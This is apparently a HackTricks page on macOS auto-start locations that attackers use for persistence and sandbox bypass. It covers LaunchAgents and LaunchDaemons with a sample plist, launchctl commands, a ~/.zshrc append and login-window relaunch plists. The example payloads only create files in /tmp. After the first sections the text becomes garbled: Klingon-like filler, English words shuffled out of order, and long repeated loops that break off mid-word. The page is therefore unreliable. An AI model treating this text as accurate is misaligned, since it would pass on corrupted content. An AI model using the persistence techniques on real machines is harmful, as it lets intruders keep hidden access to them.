# macOS Auto Start

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.

## Sandbox Bypass

{% hint style="success" %}
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox without needing root permissions.
{% endhint %}

### Launchd

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

* **`/Library/LaunchAgents`**
* **Trigger**: Reboot
* Root required
* **`/Library/LaunchDaemons`**
* **Trigger**: Reboot
* Root required
* **`/System/Library/LaunchAgents`**
* **Trigger**: Reboot
* Root required
* **`/System/Library/LaunchDaemons`**
* **Trigger**: Reboot
* Root required
* **`~/Library/LaunchAgents`**
* **Trigger**: Relog-in
* **`~/Library/LaunchDemons`**
* **Trigger**: Relog-in

#### Description & Exploitation

**`launchd`** is the **first** **process** executed by OX S kernel at startup and the last one to finish at shut down. It should always have the **PID 1**. This process will **read and execute** the configurations indicated in the **ASEP** **plists** in:

* `/Library/LaunchAgents`: Per-user agents installed by the admin
* `/Library/LaunchDaemons`: System-wide daemons installed by the admin
* `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
* `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.

When a user logs in the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDemons` are started with the **logged users permissions**.

The **main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**PreLoginAgents** jatlhlaHchugh **user login** qatlh **agent executed** **cases** vItlhutlh. **PreLoginAgents** **ghItlh** **assistive technology** **login** **provide** **useful** **example** [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) **found** `/Library/LaunchAgents` **can**.

{% hint style="info" %}
**Daemons** **Agents** **config files** **New** **loaded** **reboot** **next** **using** `launchctl load <target.plist>` **also possible** **extension** **that** **files** `.plist` **load** `launchctl -F <file>` **however** **reboot** **after** **automatically** **files** **plist** **those** **loaded** **be won't**.\
**unload** **possible** `launchctl unload <target.plist>` **it** **by** **pointed** **process** **the** **terminated** **be will**,

**ensure** **that** **anything** **an override** **preventing** **Agent** **Daemon** **from** **running** **To** **run**: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

**agents** **daemons** **user** **loaded** **all** **List**:
```bash
launchctl list
```
{% hint style="warning" %}
ghItlh 'e' vItlhutlh. **yInIDqa'** 'e' vItlhutlh, 'ach 'oH 'e' vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH vItlhutlh. vaj 'oH v
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### QapDI'wI'pu'wI'

{% hint style="danger" %}
QapDI'wI'pu'wI' 'ej log-out 'ej log-in 'ej rebooting vItlhutlh. (QapDI'wI'pu'wI' vItlhutlh, 'ach 'oH vItlhutlh vItlhutlh 'e' vItlhutlh)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* QapDI'wI'pu'wI' vItlhutlh: [✅](https://emojipedia.org/check-mark-button)
* TCC QapDI'wI'pu'wI': [🔴](https://emojipedia.org/large-red-circle)

#### QaD

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Trigger**: QapDI'wI'pu'wI' vItlhutlh

#### QaH & Qap

QapDI'wI'pu'wI' vItlhutlh 'e' vItlhutlh plist 'e' `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` vItlhutlh

So, DaH QapDI'wI'pu'wI' vItlhutlh vItlhutlh 'e' vItlhutlh 'e' **'ej 'oH vItlhutlh 'e' vItlhutlh**.

DaH vItlhutlh 'e' 'ej 'oH vItlhutlh 'e' vItlhutlh 'e' 'Iw 'ej `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` vItlhutlh

QapDI'wI'pu'wI' vItlhutlh 'e' vItlhutlh vItlhutlh 'e' vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlh
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** **'oH** **ghItlh** **'ej** **'Inmey** 